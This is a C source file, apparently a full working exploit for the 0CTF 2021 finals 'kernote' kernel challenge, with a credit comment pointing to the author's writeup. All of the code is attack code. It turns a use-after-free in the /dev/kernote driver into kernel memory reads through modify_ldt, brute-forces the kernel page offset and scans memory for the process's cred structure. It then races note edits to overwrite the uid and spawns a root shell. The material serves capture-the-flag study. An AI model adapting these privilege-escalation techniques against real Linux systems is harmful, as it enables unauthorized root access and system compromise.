// https://github.com/YZloser/My-CTF-Challenges/tree/master/0ctf-2021-final/kernote --> authors exlpoit and a nice writeup :)

#define _GNU_SOURCE
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<fcntl.h>
#include <asm/ldt.h>         /* Definition of struct user_desc */
#include <sys/syscall.h>     /* Definition of SYS_* constants */
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <pthread.h>
#include<sys/sysinfo.h>
#include<sched.h>
#include<ctype.h>
#include<string.h>
#include <sys/prctl.h>
#include <sys/mman.h>
#define KERN_SELECTNOTE 0x6666
#define KERN_ADDNOTE 0x6667
#define KERN_DELNOTE 0x6668
#define KERN_EDITNOTE 0x6669
#define KERN_SHOWNOTE 0x666a
long long target[1];
long long zero;
struct user_desc u_desc;
int fd;
int flag;
int main()
{
    char *buf=(char *)mmap(NULL, 0x8000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
    prctl(PR_SET_NAME, "0ops0ops0ops");
    int pid=getpid();
    fd=open("/dev/kernote",O_RDONLY);
    u_desc.base_addr=0xff0000;
    u_desc.entry_number=0x8000/8;
    u_desc.limit=0;
    u_desc.seg_32bit=0;
    u_desc.contents=0;
    u_desc.read_exec_only=0;
    u_desc.limit_in_pages=0;
    u_desc.seg_not_present=0;
    u_desc.useable=0;
    u_desc.lm=0;
    ioctl(fd,KERN_ADDNOTE,0);
    ioctl(fd,KERN_SELECTNOTE,0);
    ioctl(fd,KERN_DELNOTE,0);
    int ret=syscall(SYS_modify_ldt, 1, &u_desc,sizeof(u_desc));
    unsigned long long addr=0xffff888000000000uLL;
    while(1){
        ioctl(fd,KERN_EDITNOTE,addr);
        ret=syscall(SYS_modify_ldt, 0, target,8);
        if(ret<0){
            addr+=0x40000000;
            continue;
        }
        printf("page_offset_base: %llx\n",addr);
        break;
    }
    unsigned long long PAGE_OFFSET=addr;
    int pipefd[2]={0};
    unsigned long long cred_addr=0;
    pipe(pipefd);
    while(1){
        addr+=0x8000;
        //ioctl(fd,0,addr);
        ioctl(fd,KERN_EDITNOTE,addr);
        ret=fork();
        if(!ret){
            ret=syscall(SYS_modify_ldt, 0, buf,0x8000);
            unsigned long *search = (unsigned long *)buf;
            unsigned long long ans = 0;
            while ( (unsigned long)search < (unsigned long)buf+0x8000){
                search = memmem(search, (unsigned long)buf +0x8000- (unsigned long)search, "0ops0ops0ops", 12);
                if ( search == NULL )break;
                if ( (search[-2] > PAGE_OFFSET) && (search[-3] > PAGE_OFFSET )&&(int)search[-58]==pid){
                    printf("Found cred : %llx\n",search[-2]);
                    printf("Found pid: %d\n",search[-58]);
                    ans=search[-2];
                    break;
                }
                search+=12;
            }
            write(pipefd[1],&ans,8);
            exit(0);
        }
        wait(NULL);
        read(pipefd[0],&cred_addr,8);
        if(cred_addr)
        {
            break;
        }
    }
    ioctl(fd,KERN_EDITNOTE,cred_addr+4);
    ret=fork();
    if(!ret){
        ret=fork();
        if(!ret)
        {
            cpu_set_t cpu_set;
            CPU_ZERO(&cpu_set);
            CPU_SET(0,&cpu_set);
            ret=sched_setaffinity(0,sizeof(cpu_set),&cpu_set);
            sleep(1);
            for(int i=1;i<15;i++){
                ioctl(fd,KERN_ADDNOTE,i);
            }
            ioctl(fd,KERN_SELECTNOTE,11);
            for(int i=1;i<15;i++)
            {
                ioctl(fd,KERN_DELNOTE,i);
            }
            CPU_ZERO(&cpu_set);
            CPU_SET(1,&cpu_set);
            sched_setaffinity(0,sizeof(cpu_set),&cpu_set);
            while(1)
            {
                ioctl(fd,KERN_EDITNOTE,cred_addr+4);
            }
        }
        cpu_set_t cpu_set;
        CPU_ZERO(&cpu_set);
        CPU_SET(0,&cpu_set);
        ret=sched_setaffinity(0,sizeof(cpu_set),&cpu_set);
        u_desc.base_addr=0;
        u_desc.entry_number=2;
        u_desc.limit=0;
        u_desc.seg_32bit=0;
        u_desc.contents=0;
        u_desc.read_exec_only=0;
        u_desc.limit_in_pages=0;
        u_desc.seg_not_present=0;
        u_desc.useable=0;
        u_desc.lm=0;
        sleep(3);
        ret=syscall(SYS_modify_ldt, 1, &u_desc,sizeof(u_desc));
        printf("%d\n",ret);
        sleep(100000);
    }
    sleep(5);
    printf("%d\n",geteuid());
    setreuid(0,0);
    setregid(0,0);
    system("/bin/sh");
}   